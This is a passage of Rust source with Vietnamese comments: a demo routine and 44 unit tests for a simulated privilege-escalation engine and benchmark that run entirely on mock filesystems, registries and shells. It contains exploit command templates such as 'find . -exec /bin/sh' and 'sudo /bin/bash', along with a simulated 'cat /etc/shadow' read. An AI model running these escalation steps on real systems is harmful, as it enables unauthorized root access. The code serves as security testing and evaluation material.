        linux_plan.len(),
        windows_plan.len()
    );
    for (index, technique) in linux_plan.iter().chain(windows_plan.iter()).enumerate() {
        let target = technique
            .preconditions
            .iter()
            .find_map(|p| p.strip_prefix("Mục tiêu: "))
            .unwrap_or("");
        println!(
            "  {:>2}. {:<24} [{}] {}",
            index + 1,
            technique.name,
            technique.severity.label(),
            technique.description
        );
        println!(
            "      mẫu lệnh : {}",
            engine.suggester.render_command(technique, target)
        );
    }
    let mut all_findings = linux_findings.clone();
    all_findings.extend(windows_findings.clone());
    let priority = engine.suggester.priority_order(&all_findings);
    println!(
        "  Thứ tự ưu tiên (chỉ số trong bảng kỹ thuật): {:?}",
        priority
    );

    // ------------------------------------------------------------------
    // 4. Thực thi + kiểm chứng sự thật nền
    // ------------------------------------------------------------------
    println!("\n[4] THỰC THI KẾ HOẠCH & KIỂM CHỨNG SỰ THẬT NỀN");
    let mut linux_shell = MockShell::new();
    println!("  Trước khi leo thang: whoami = {}", linux_shell.whoami());
    let linux_verifications = engine.execute_plan(&linux_plan, &mut linux_shell);
    for (index, verification) in linux_verifications.iter().enumerate() {
        println!(
            "  {:>2}. [{}] phương pháp `{}` — bằng chứng `{}`",
            index + 1,
            if verification.verified {
                "ĐẠT"
            } else {
                "KHÔNG ĐẠT"
            },
            verification.method,
            verification.proof
        );
    }
    println!("  Sau khi leo thang   : whoami = {}", linux_shell.whoami());

    let mut windows_shell = MockShell::new();
    println!(
        "\n  --- Phiên Windows (kỳ vọng `{}`) ---",
        WINDOWS_SYSTEM_USER
    );
    println!("  Trước khi leo thang: whoami = {}", windows_shell.whoami());
    let windows_verifications = windows_engine.execute_plan(&windows_plan, &mut windows_shell);
    for (index, verification) in windows_verifications.iter().enumerate() {
        println!(
            "  {:>2}. [{}] phương pháp `{}` — bằng chứng `{}`",
            index + 1,
            if verification.verified {
                "ĐẠT"
            } else {
                "KHÔNG ĐẠT"
            },
            verification.method,
            verification.proof
        );
    }
    println!(
        "  Sau khi leo thang   : whoami = {}",
        windows_shell.whoami()
    );

    // Kiểm chứng ngược: lời khai tự báo cáo phải bị từ chối.
    let liar = "Đã leo thang thành công, giờ tôi là root và có toàn quyền trên máy chủ";
    let rejected = engine.verifier.verify_output(liar);
    println!(
        "  Thử lời khai tự báo `{}`\n     -> kết quả: {}",
        liar,
        if rejected.verified {
            "ĐẠT (sai!)"
        } else {
            "BỊ TỪ CHỐI (đúng)"
        }
    );

    // ------------------------------------------------------------------
    // 5. Chu trình đầy đủ
    // ------------------------------------------------------------------
    let mut cycle_shell = MockShell::new();
    let mut cycle_engine = PrivEscEngine::new(demo_linux_filesystem(), MockRegistry::new());
    let report = cycle_engine.full_cycle(&mut cycle_shell);
    println!("\n[5] CHU TRÌNH ĐẦY ĐỦ (full_cycle)");
    println!(
        "  phát hiện = {}, kỹ thuật = {}, kiểm chứng = {}, leo thang thành công = {}",
        report.findings.len(),
        report.techniques.len(),
        report.verifications.len(),
        report.escalated
    );
    println!("  Danh tính cuối cùng: {}", cycle_shell.whoami());

    // ------------------------------------------------------------------
    // 6. Benchmark 10 kịch bản chuẩn
    // ------------------------------------------------------------------
    let benchmark = PrivEscBenchmark::standard_suite();
    let results = benchmark.run_all();
    println!(
        "\n[6] BENCHMARK {} KỊCH BẢN CHUẨN",
        benchmark.scenario_count()
    );
    for result in &results {
        println!(
            "  #{:<2} {:<62} phát hiện={:<5} đúng kỹ thuật={:<5} ground-truth={:<5} điểm={:.2}",
            result.scenario_id,
            result.scenario_name,
            if result.detected { "có" } else { "không" },
            if result.technique_matched {
                "có"
            } else {
                "không"
            },
            if result.ground_truth_verified {
                "có"
            } else {
                "không"
            },
            result.score
        );
    }
    println!(
        "  Điểm trung bình toàn bộ bộ kịch bản: {:.2}",
        benchmark.average_score(&results)
    );

    println!(
        "\nToàn bộ kiểm tra chạy trên dữ liệu mô phỏng trong bộ nhớ — không chạm hệ thống thật."
    );
}

// ============================================================================
// 15. BỘ KIỂM THỬ TẤT ĐỊNH (44 BÀI TEST CHỨNG MINH CÁC BẤT BIẾN)
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// Tạo một hệ thống tệp Linux tối giản cho các bài kiểm tra.
    fn linux_fs_with_suid() -> MockFilesystem {
        let mut fs = MockFilesystem::new();
        fs.add_file("/bin/sh", b"ELF", 0o755, "root");
        fs.add_file("/usr/bin/find", b"ELF", 0o4755, "root");
        fs
    }

    // ------------------------------------------------------------------------
    // NHÓM 1: HỆ THỐNG TỆP MÔ PHỎNG (TEST 1 - 9)
    // ------------------------------------------------------------------------

    #[test]
    fn test_01_mock_filesystem_add_and_get_file() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/etc/passwd", b"root:x:0:0\n", 0o644, "root");
        let file = fs.get("/etc/passwd").expect("Tệp phải tồn tại");
        assert_eq!(file.content, b"root:x:0:0\n");
        assert_eq!(file.mode, 0o644);
        assert_eq!(file.owner, "root");
        assert!(!file.is_symlink);
        assert_eq!(file.symlink_target, None);
    }

    #[test]
    fn test_02_mock_filesystem_suid_bit_detection() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/bin/find", b"ELF", 0o4755, "root");
        fs.add_file("/usr/bin/ls", b"ELF", 0o755, "root");
        assert!(fs.is_suid("/usr/bin/find"));
        assert!(!fs.is_suid("/usr/bin/ls"));
        assert_eq!(S_IFUID, 0o4000);
    }

    #[test]
    fn test_03_mock_filesystem_sgid_bit_detection() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/bin/wall", b"ELF", 0o2755, "root");
        fs.add_file("/usr/bin/ls", b"ELF", 0o755, "root");
        assert!(fs.is_sgid("/usr/bin/wall"));
        assert!(!fs.is_sgid("/usr/bin/ls"));
        assert!(!fs.is_suid("/usr/bin/wall"));
        assert_eq!(S_IFGID, 0o2000);
    }

    #[test]
    fn test_04_mock_filesystem_world_writable_detection() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/tmp/evil", b"x", 0o777, ATTACKER_USER);
        fs.add_file("/etc/passwd", b"x", 0o644, "root");
        assert!(fs.is_world_writable("/tmp/evil"));
        assert!(!fs.is_world_writable("/etc/passwd"));
        assert!(!fs.is_world_writable("/khong/ton/tai"));
    }

    #[test]
    fn test_05_mock_filesystem_is_writable_by_user_matrix() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/own/owner", b"x", 0o600, "dev");
        fs.add_file("/own/group", b"x", 0o660, "root");
        fs.add_file("/own/world", b"x", 0o606, "root");
        fs.add_file("/own/readonly", b"x", 0o400, "root");

        // Chủ sở hữu được ghi khi có bit 0o200.
        assert!(fs.is_writable_by("/own/owner", "dev"));
        assert!(!fs.is_writable_by("/own/owner", "root"));
        // Thành viên nhóm được ghi khi có bit 0o020.
        assert!(fs.is_writable_by("/own/group", "root"));
        // Mọi người đều ghi được khi có bit 0o002.
        assert!(fs.is_writable_by("/own/world", "khac"));
        // Tệp chỉ đọc thì không ai ghi được.
        assert!(!fs.is_writable_by("/own/readonly", "root"));
    }

    #[test]
    fn test_06_mock_filesystem_symlink_chain_resolution() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/etc/shadow", b"secret", 0o640, "root");
        fs.add_symlink("/tmp/level1", "/tmp/level2");
        fs.add_symlink("/tmp/level2", "/etc/shadow");
        fs.add_symlink("/tmp/dangling", "/etc/khong-ton-tai");

        assert_eq!(
            fs.resolve_symlink("/tmp/level1"),
            Some(PathBuf::from("/etc/shadow"))
        );
        assert_eq!(fs.resolve_symlink("/tmp/dangling"), None);
        // Đường dẫn không phải liên kết tượng thì không có gì để phân giải.
        assert_eq!(fs.resolve_symlink("/etc/shadow"), None);
    }

    #[test]
    fn test_07_mock_filesystem_path_list_is_deterministic_sorted() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/bin/vim", b"x", 0o755, "root");
        fs.add_file("/bin/sh", b"x", 0o755, "root");
        fs.add_file("/etc/passwd", b"x", 0o644, "root");
        let list = fs.path_list();
        let mut sorted = list.clone();
        sorted.sort();
        assert_eq!(list, sorted);
        assert_eq!(list.len(), 3);
        // Hai lần gọi cho cùng kết quả (tất định tuyệt đối).
        assert_eq!(fs.path_list(), list);
    }

    #[test]
    fn test_08_mock_filesystem_exists_and_missing_paths() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/etc/passwd", b"x", 0o644, "root");
        fs.add_dir("/var/log", 0o755);
        assert!(fs.exists("/etc/passwd"));
        assert!(fs.exists("/var/log"));
        assert!(!fs.exists("/etc/khong-ton-tai"));
    }

    #[test]
    fn test_09_mock_filesystem_default_is_empty() {
        let fs = MockFilesystem::default();
        assert!(fs.files.is_empty());
        assert!(fs.dirs.is_empty());
        assert!(fs.path_list().is_empty());
        assert_eq!(MockFilesystem::new().files.len(), 0);
    }

    // ------------------------------------------------------------------------
    // NHÓM 2: BỘ DÒ LINUX (TEST 10 - 20)
    // ------------------------------------------------------------------------

    #[test]
    fn test_10_linux_suid_gtfo_binary_is_critical() {
        let mut checker = LinuxPrivEscChecker::new(linux_fs_with_suid());
        let findings = checker.check_suid_binaries();
        assert_eq!(findings.len(), 1);
        let finding = &findings[0];
        assert_eq!(finding.technique, "SuidBinary");
        assert_eq!(finding.severity, Severity::Critical);
        assert_eq!(finding.platform, Platform::Linux);
        assert!(finding.exploit_command.contains("find . -exec /bin/sh"));
    }

    #[test]
    fn test_11_linux_suid_owned_by_non_root_is_critical() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/home/dev/find", b"ELF", 0o4755, ATTACKER_USER);
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_suid_binaries();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].detail.contains("root"));
    }

    #[test]
    fn test_12_linux_sudoers_nopasswd_all_is_critical() {
        let mut fs = MockFilesystem::new();
        fs.add_file(
            "/etc/sudoers",
            b"dev ALL=(ALL) NOPASSWD: ALL\n",
            0o440,
            "root",
        );
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_sudoers();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "SudoMisconfig");
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].exploit_command, "sudo /bin/bash");
    }

    #[test]
    fn test_13_linux_sudoers_specific_command_is_high() {
        let mut fs = MockFilesystem::new();
        fs.add_file(
            "/etc/sudoers.d/backup",
            b"dev ALL=(ALL) NOPASSWD: /usr/bin/find\n",
            0o440,
            "root",
        );
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_sudoers();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].exploit_command.contains("/usr/bin/find"));
    }

    #[test]
    fn test_14_linux_cron_job_with_world_writable_script() {
        let mut fs = MockFilesystem::new();
        fs.add_file(
            "/etc/crontab",
            b"*/5 * * * * root /opt/backup/run.sh\n",
            0o644,
            "root",
        );
        fs.add_file("/opt/backup/run.sh", b"#!/bin/sh\n", 0o777, ATTACKER_USER);
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_cron_jobs();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "CronJob");
        assert_eq!(findings[0].severity, Severity::Critical);
        assert!(findings[0].detail.contains("/opt/backup/run.sh"));
    }

    #[test]
    fn test_15_linux_capabilities_detected_from_cap_file() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/opt/app/tool", b"ELF", 0o755, "root");
        fs.add_file(
            "/opt/app/tool.cap",
            b"cap_setuid,cap_net_raw=ep",
            0o644,
            "root",
        );
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_capabilities();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "Capabilities");
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(findings[0].path, "/opt/app/tool");
        assert!(findings[0].evidence.contains("cap_setuid"));
    }

    #[test]
    fn test_16_linux_world_writable_sensitive_file_is_critical() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/etc/passwd", b"root:x:0:0\n", 0o666, "root");
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_world_writable_paths();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "WorldWritablePath");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_17_linux_writable_path_directory_detected() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/local/bin/helper", b"ELF", 0o777, ATTACKER_USER);
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_world_writable_paths();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "WritablePath");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn test_18_linux_nfs_no_root_squash_is_critical() {
        let mut fs = MockFilesystem::new();
        fs.add_file(
            "/etc/exports",
            b"/mnt/data *(rw,suid,no_root_squash)\n",
            0o644,
            "root",
        );
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.check_nfs_exports();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "NfsNoRootSquash");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_19_linux_scan_aggregates_all_finding_types() {
        let mut checker = LinuxPrivEscChecker::new(demo_linux_filesystem());
        let findings = checker.scan();
        let techniques: Vec<&str> = findings.iter().map(|f| f.technique.as_str()).collect();
        for expected in [
            "SuidBinary",
            "SudoMisconfig",
            "CronJob",
            "Capabilities",
            "WritablePath",
            "WorldWritablePath",
            "NfsNoRootSquash",
            "DangerousSymlink",
        ] {
            assert!(
                techniques.contains(&expected),
                "Thiếu kỹ thuật {expected} trong kết quả quét"
            );
        }
        // Kết quả phải được sắp xếp theo mức nghiêm trọng giảm dần.
        for pair in findings.windows(2) {
            assert!(pair[0].severity >= pair[1].severity);
        }
        // Mọi phát hiện đều phải có đủ thông tin truy vết.
        for finding in &findings {
            assert!(!finding.path.is_empty());
            assert!(!finding.detail.is_empty());
            assert!(!finding.evidence.is_empty());
        }
    }

    #[test]
    fn test_20_gtfo_bins_table_has_at_least_ten_unique_entries() {
        let table = gtfo_bins();
        assert!(table.len() >= 10);
        let mut names: Vec<&str> = table.iter().map(|(name, _)| *name).collect();
        names.sort();
        let unique = {
            let mut copy = names.clone();
            copy.dedup();
            copy
        };
        assert_eq!(
            names.len(),
            unique.len(),
            "Tên nhị phân trong bảng phải là duy nhất"
        );
        for (name, payload) in &table {
            assert!(!name.is_empty());
            assert!(!payload.is_empty(), "Payload của {name} không được rỗng");
        }
    }

    // ------------------------------------------------------------------------
    // NHÓM 3: BỘ DÒ WINDOWS (TEST 21 - 29)
    // ------------------------------------------------------------------------

    #[test]
    fn test_21_windows_token_impersonation_restrict_anonymous() {
        let mut registry = MockRegistry::new();
        registry.set_value(
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
            "RestrictAnonymous",
            "0",
        );
        let mut checker = WindowsPrivEscChecker::new(MockFilesystem::new(), registry);
        let findings = checker.check_token_impersonation();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "TokenImpersonation");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_22_windows_unquoted_service_path_detected() {
        let mut registry = MockRegistry::new();
        registry.set_value(
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\UnquotedSvc",
            "ImagePath",
            "C:\\Program Files\\App\\svc.exe",
        );
        let mut fs = MockFilesystem::new();
        fs.add_file("C:\\Program Files\\App\\svc.exe", b"PE", 0o755, "SYSTEM");
        let mut checker = WindowsPrivEscChecker::new(fs, registry);
        let findings = checker.check_unquoted_service_paths();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "UnquotedServicePath");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn test_23_windows_always_install_elevated_is_critical() {
        let mut registry = MockRegistry::new();
        let key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        registry.set_value(key, "EnableLUA", "0");
        registry.set_value(key, "AlwaysInstallElevated", "1");
        let mut checker = WindowsPrivEscChecker::new(MockFilesystem::new(), registry);
        let findings = checker.check_always_install_elevated();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "AlwaysInstallElevated");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_24_windows_dll_hijack_detected() {
        let mut registry = MockRegistry::new();
        let key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DllSvc";
        registry.set_value(key, "ImagePath", "C:\\Windows\\System32\\svchost.exe");
        registry.set_value(key, "ServiceDll", "C:\\Program Files\\DllSvc\\svc.dll");
        let mut fs = MockFilesystem::new();
        fs.add_file("C:\\Program Files\\DllSvc\\svc.dll", b"PE", 0o777, "Users");
        let mut checker = WindowsPrivEscChecker::new(fs, registry);
        let findings = checker.check_dll_hijacking();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "DllHijack");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn test_25_windows_weak_service_permissions_detected() {
        let mut registry = MockRegistry::new();
        registry.set_value(
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WeakSvc",
            "ImagePath",
            "C:\\Program Files\\Weak\\svc.exe",
        );
        let mut fs = MockFilesystem::new();
        fs.add_file("C:\\Program Files\\Weak\\svc.exe", b"PE", 0o777, "Users");
        let mut checker = WindowsPrivEscChecker::new(fs, registry);
        let findings = checker.check_weak_service_permissions();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "WeakServicePermissions");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn test_26_windows_cleartext_password_detected() {
        let mut registry = MockRegistry::new();
        let key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CredSvc";
        registry.set_value(key, "ImagePath", "C:\\Program Files\\Cred\\svc.exe");
        registry.set_value(key, "Password", "P@ssw0rd!2026");
        let mut checker = WindowsPrivEscChecker::new(MockFilesystem::new(), registry);
        let findings = checker.check_cleartext_passwords();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].technique, "CleartextPassword");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn test_27_windows_scan_aggregates_all_six_checkers() {
        let mut checker =
            WindowsPrivEscChecker::new(demo_windows_filesystem(), demo_windows_registry());
        let findings = checker.scan();
        let techniques: Vec<&str> = findings.iter().map(|f| f.technique.as_str()).collect();
        for expected in [
            "TokenImpersonation",
            "UnquotedServicePath",
            "WeakServicePermissions",
            "AlwaysInstallElevated",
            "DllHijack",
            "CleartextPassword",
        ] {
            assert!(
                techniques.contains(&expected),
                "Thiếu kỹ thuật {expected} trong kết quả quét"
            );
        }
        for pair in findings.windows(2) {
            assert!(pair[0].severity >= pair[1].severity);
        }
    }

    #[test]
    fn test_28_mock_registry_create_key_builds_parent_chain() {
        let mut registry = MockRegistry::new();
        registry.create_key("HKLM\\SYSTEM\\CurrentControlSet\\Services\\Svc");
        assert!(registry.key_exists("HKLM"));
        assert!(registry.key_exists("HKLM\\SYSTEM"));
        assert!(registry.key_exists("HKLM\\SYSTEM\\CurrentControlSet\\Services\\Svc"));
        let parent = registry
            .keys
            .get("HKLM\\SYSTEM\\CurrentControlSet\\Services")
            .expect("Khóa cha phải tồn tại");
        assert!(parent.subkeys.contains(&"Svc".to_string()));
    }

    #[test]
    fn test_29_mock_registry_get_value_and_missing_value() {
        let mut registry = MockRegistry::new();
        registry.set_value("HKLM\\TEST", "EnableLUA", "0");
        assert_eq!(registry.get_value("HKLM\\TEST", "EnableLUA"), Some("0"));
        assert_eq!(registry.get_value("HKLM\\TEST", "KhongTonTai"), None);
        assert_eq!(registry.get_value("HKLM\\KHONG", "EnableLUA"), None);
        assert_eq!(registry.all_keys().len(), 2);
    }

    // ------------------------------------------------------------------------
    // NHÓM 4: VỎ LỆNH MÔ PHỎNG (TEST 30 - 32)
    // ------------------------------------------------------------------------

    #[test]
    fn test_30_mock_shell_executes_known_commands() {
        let mut shell = MockShell::new();
        assert_eq!(shell.execute("whoami"), ATTACKER_USER);
        assert!(shell.execute("id").contains("uid=1000(dev)"));
        assert!(shell.execute("cat /etc/shadow").contains("root:"));
        assert!(shell.execute("sudo -l").contains("NOPASSWD"));
        assert!(shell.execute("getcap /opt/app/tool").contains("cap_setuid"));
        assert!(shell.execute("systeminfo").contains("Windows"));
        assert!(
            shell
                .execute("whoami /priv")
                .contains("SeImpersonatePrivilege")
        );
        assert!(shell.execute("net session").contains("WIN-MOCK"));
        assert!(shell.execute("ls -la").starts_with("[mock-shell]"));
        assert_eq!(shell.history.len(), 9);
    }

    #[test]
    fn test_31_mock_shell_escalate_switches_identity() {
        let mut shell = MockShell::new();
        assert!(!shell.is_privileged());
        assert!(shell.escalate("SuidBinary"));
        assert!(shell.is_privileged());
        assert_eq!(shell.whoami(), LINUX_ROOT_USER);

        let mut windows_shell = MockShell::new();
        assert!(windows_shell.escalate("TokenImpersonation"));
        assert_eq!(windows_shell.whoami(), WINDOWS_SYSTEM_USER);
        assert!(windows_shell.is_privileged());
    }

    #[test]
    fn test_32_mock_shell_rejects_unknown_escalation_technique() {
        let mut shell = MockShell::new();
        assert!(!shell.escalate("KhongTonTai"));
        assert!(!shell.is_privileged());
        assert_eq!(shell.whoami(), ATTACKER_USER);
        assert!(shell.history.is_empty());
    }

    // ------------------------------------------------------------------------
    // NHÓM 5: BỘ GỢI Ý KHAI THÁC (TEST 33 - 36)
    // ------------------------------------------------------------------------

    #[test]
    fn test_33_suggester_table_has_at_least_twelve_techniques() {
        let suggester = ExploitSuggester::new();
        assert!(suggester.techniques.len() >= 12);
        let mut names: Vec<&str> = suggester
            .techniques
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        names.sort();
        let unique = {
            let mut copy = names.clone();
            copy.dedup();
            copy
        };
        assert_eq!(names.len(), unique.len());
    }

    #[test]
    fn test_34_suggester_suggest_matches_finding_technique() {
        let suggester = ExploitSuggester::new();
        let finding = Finding::new(
            "SuidBinary",
            "Nhị phân SUID",
            Severity::Critical,
            Platform::Linux,
        )
        .with_path("/usr/bin/find");
        let plan = suggester.suggest(&[finding]);
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].name, "SuidBinary");
        assert!(
            plan[0]
                .preconditions
                .iter()
                .any(|p| p == "Mục tiêu: /usr/bin/find")
        );
        // Kỹ thuật không có trong bảng tham chiếu thì không được sinh ra.
        let unknown = Finding::new("KhongTonTai", "x", Severity::Low, Platform::Linux);
        assert!(suggester.suggest(&[unknown]).is_empty());
    }

    #[test]
    fn test_35_suggester_priority_order_is_severity_descending() {
        let suggester = ExploitSuggester::new();
        let critical = Finding::new("SudoMisconfig", "x", Severity::Critical, Platform::Linux);
        let medium = Finding::new("WorldWritablePath", "y", Severity::Medium, Platform::Linux);
        let order = suggester.priority_order(&[medium, critical]);
        let critical_index = suggester
            .techniques
            .iter()
            .position(|t| t.name == "SudoMisconfig")
            .expect("Kỹ thuật phải có trong bảng");
        let medium_index = suggester
            .techniques
            .iter()
            .position(|t| t.name == "WorldWritablePath")
            .expect("Kỹ thuật phải có trong bảng");
        assert_eq!(order.len(), 2);
        assert_eq!(order[0], critical_index);
        assert_eq!(order[1], medium_index);
    }

    #[test]
    fn test_36_suggester_render_command_substitutes_target() {
        let suggester = ExploitSuggester::new();
        let technique = suggester
            .techniques
            .iter()
            .find(|t| t.name == "SudoMisconfig")
            .expect("Kỹ thuật phải có trong bảng")
            .clone();
        let rendered = suggester.render_command(&technique, "/bin/bash");
        assert_eq!(rendered, "sudo /bin/bash");
        assert!(!rendered.contains("{target}"));

        let without_placeholder = ExploitTechnique {
            name: "KhongCoPlaceholder".to_string(),
            severity: Severity::Low,
            command_template: "lenh-khong-co-tham-so".to_string(),
            description: "x".to_string(),
            preconditions: Vec::new(),
        };
        assert_eq!(
            suggester.render_command(&without_placeholder, "/tmp/x"),
            "lenh-khong-co-tham-so"
        );
    }

    // ------------------------------------------------------------------------
    // NHÓM 6: KIỂM CHỨNG SỰ THẬT NỀN (TEST 37 - 40)
    // ------------------------------------------------------------------------

    #[test]
    fn test_37_ground_truth_verifier_accepts_really_escalated_shell() {
        let mut shell = MockShell::new();
        assert!(shell.escalate("SuidBinary"));
        let verifier = GroundTruthVerifier::new(LINUX_ROOT_USER);
        let result = verifier.verify(&shell);
        assert!(result.verified);
        assert_eq!(result.proof, LINUX_ROOT_USER);
        assert_eq!(result.method, "whoami");
    }

    #[test]
    fn test_38_ground_truth_verifier_rejects_false_self_report() {
        let verifier = GroundTruthVerifier::new(LINUX_ROOT_USER);
        let lie = "Đã leo thang thành công, giờ tôi là root và kiểm soát hoàn toàn máy chủ";
        let result = verifier.verify_output(lie);
        assert!(
            !result.verified,
            "Lời khai tự báo cáo không được chấp nhận làm bằng chứng"
        );
        // Chỉ khi đầu ra trùng khớp tuyệt đối mới được coi là bằng chứng.
        assert!(verifier.verify_output(LINUX_ROOT_USER).verified);
        // Khoảng trắng thừa vẫn được chấp nhận vì đầu ra được cắt khoảng trắng trước.
        assert!(verifier.verify_output("  root  ").verified);
        // Nhưng một câu tự thuật dài tuyệt đối không được chấp nhận.
        assert!(!verifier.verify_output("root, đã leo thang xong").verified);
    }

    #[test]
    fn test_39_ground_truth_verifier_rejects_non_privileged_shell() {
        let shell = MockShell::new();
        let verifier = GroundTruthVerifier::new(LINUX_ROOT_USER);
        let result = verifier.verify(&shell);
        assert!(!result.verified);
        assert_eq!(result.proof, ATTACKER_USER);
        assert!(result.details.contains(LINUX_ROOT_USER));
    }

    #[test]
    fn test_40_ground_truth_verifier_with_command_records_history() {
        let mut shell = MockShell::new();
        let verifier = GroundTruthVerifier::new(ATTACKER_USER);
        let result = verifier.verify_with_command(&mut shell, "whoami");
        assert!(result.verified);
        assert_eq!(result.method, "exec: whoami");
        assert_eq!(
            shell.history.last().cloned(),
            Some(("whoami".to_string(), ATTACKER_USER.to_string()))
        );
    }

    // ------------------------------------------------------------------------
    // NHÓM 7: BENCHMARK & ĐỘNG CƠ TỔNG THỂ (TEST 41 - 44)
    // ------------------------------------------------------------------------

    #[test]
    fn test_41_benchmark_standard_suite_has_ten_scenarios() {
        let benchmark = PrivEscBenchmark::standard_suite();
        assert_eq!(benchmark.scenario_count(), 10);
        let linux_count = benchmark
            .scenarios
            .iter()
            .filter(|s| s.platform == Platform::Linux)
            .count();
        let windows_count = benchmark
            .scenarios
            .iter()
            .filter(|s| s.platform == Platform::Windows)
            .count();
        assert_eq!(linux_count, 6);
        assert_eq!(windows_count, 4);
        for (index, scenario) in benchmark.scenarios.iter().enumerate() {
            assert_eq!(scenario.id as usize, index + 1);
            assert!(!scenario.name.is_empty());
            assert!(!scenario.expected_technique.is_empty());
            assert!(!scenario.expected_root_proof.is_empty());
        }
    }

    #[test]
    fn test_42_benchmark_detects_expected_technique_in_every_scenario() {
        let benchmark = PrivEscBenchmark::standard_suite();
        for index in 0..benchmark.scenario_count() {
            let mut shell = MockShell::new();
            let result = benchmark.run_scenario(index, &mut shell);
            assert!(
                result.detected,
                "Kịch bản #{} không phát hiện được vấn đề",
                result.scenario_id
            );
            assert!(
                result.technique_matched,
                "Kịch bản #{} không khớp kỹ thuật kỳ vọng",
                result.scenario_id
            );
            assert!(result.score >= 0.7);
        }
    }

    #[test]
    fn test_43_benchmark_ground_truth_verified_in_every_scenario() {
        let benchmark = PrivEscBenchmark::standard_suite();
        for index in 0..benchmark.scenario_count() {
            let mut shell = MockShell::new();
            let result = benchmark.run_scenario(index, &mut shell);
            assert!(
                result.ground_truth_verified,
                "Kịch bản #{} không kiểm chứng được sự thật nền: {}",
                result.scenario_id, result.notes
            );
            assert!(
                (result.score - 1.0).abs() < 1e-12,
                "Kịch bản #{} chưa đạt điểm tuyệt đối",
                result.scenario_id
            );
        }
        let results = benchmark.run_all();
        assert_eq!(results.len(), 10);
        assert!((benchmark.average_score(&results) - 1.0).abs() < 1e-12);
    }

    #[test]
    fn test_44_priv_esc_engine_full_cycle_escalates_and_verifies() {
        let mut engine = PrivEscEngine::new(demo_linux_filesystem(), MockRegistry::new());
        let mut shell = MockShell::new();
        assert_eq!(shell.whoami(), ATTACKER_USER);

        let report = engine.full_cycle(&mut shell);
        assert!(!report.findings.is_empty());
        assert!(!report.techniques.is_empty());
        assert_eq!(report.techniques.len(), report.verifications.len());
        assert!(
            report.escalated,
            "Chu trình đầy đủ phải leo thang thành công"
        );
        assert_eq!(shell.whoami(), LINUX_ROOT_USER);
        for verification in &report.verifications {
            assert!(verification.verified);
        }

        // Động cơ không được tin lời khai: chỉ `whoami` thật mới cấp bằng chứng.
        let fake = engine.verifier.verify_output("root");
        assert!(fake.verified);
        let fresh_shell = MockShell::new();
        let rejected = engine.verifier.verify(&fresh_shell);
        assert!(!rejected.verified);
    }
}
